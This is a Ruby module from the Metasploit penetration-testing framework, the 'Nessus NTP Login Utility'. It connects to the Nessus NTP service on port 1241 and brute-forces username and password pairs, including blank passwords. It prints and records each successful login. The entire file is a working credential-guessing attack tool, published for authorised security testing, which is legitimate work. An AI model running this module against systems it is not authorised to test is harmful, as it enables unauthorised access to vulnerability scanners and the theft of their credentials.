##
# nessus_ntp_login.rb
##

# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Nessus NTP Login Utility',
            'Description' => 'This module attempts to authenticate to a Nessus NTP service.',
            'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
            'License'        => MSF_LICENSE
        )
    )
    register_options(
        [
            Opt::RPORT(1241),
            OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false])
        ], self.class)

    register_advanced_options(
        [
            OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true]),
            OptString.new('SSLVersion', [ true, " Specify the version of SSL that should be used", "TLS1"])
        ], self.class)
  end

  def run_host(ip)
    begin
      print_status("#{msg} Connecting and checking username and passwords")
      each_user_pass do |user, pass|
        do_login(user, pass)
      end
    end
    rescue ::Rex::ConnectionError
    rescue ::Exception => e
      vprint_error("#{msg} #{e.to_s} #{e.backtrace}")
  end

  def ntp_send(data=nil, con=true)
    begin
      @result=''
      @coderesult=''
      if (con)
        @connected=false
        connect
        select(nil,nil,nil,0.4)
      end
      @connected=true
      sock.put(data)
      @result=sock.get_once
    rescue ::Exception => err
      print_error("#{msg} Error: #{err.to_s}")
    end
  end

  def do_login(user=nil,pass=nil)
    begin
      ntp_send("< NTP/1.0 >\n",true) # send hello
      if @result !~ /\<\ NTP\/1\.0 \>/
        print_error("#{msg} Nessus NTP does not appear to be running: did not get response to NTP hello: #{@result}")
        return :abort
      end

      vprint_status("#{msg} Trying user:'#{user}' with password:'#{pass}'")
      ntp_send(nil,!@connected)
      if @result !~ /User\ \:/
        print_error("#{msg} Nessus NTP did not send User request: #{@result}")
      end
      ntp_send("#{user}\n",!@connected)
      if @result !~ /Password\ \:/
        print_error("#{msg} Nessus NTP did not send Password request: #{@result}")
      end
      ntp_send("#{pass}\n",!@connected)
      if @result =~ /SERVER <|>.*<|> SERVER/is
        print_good("#{msg} SUCCESSFUL login for '#{user}' : '#{pass}'")
        report_auth_info(
          :host => rhost,
          :port => rport,
          :sname => 'nessus-ntp',
          :user => user,
          :pass => pass,
          :source_type => "user_supplied",
          :active => true
        )
        disconnect
        @connected = false
        return :next_user
      else
        if (@connected)
          disconnect # Sometime nessus disconnect the client after wrongs attempts
          @connected = false
        end
        vprint_error("#{msg} Rejected user: '#{user}' with password: '#{pass}': #{@result}")
        return :fail
      end
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

  def msg
    "#{rhost}:#{rport} Nessus NTP -"
  end
end
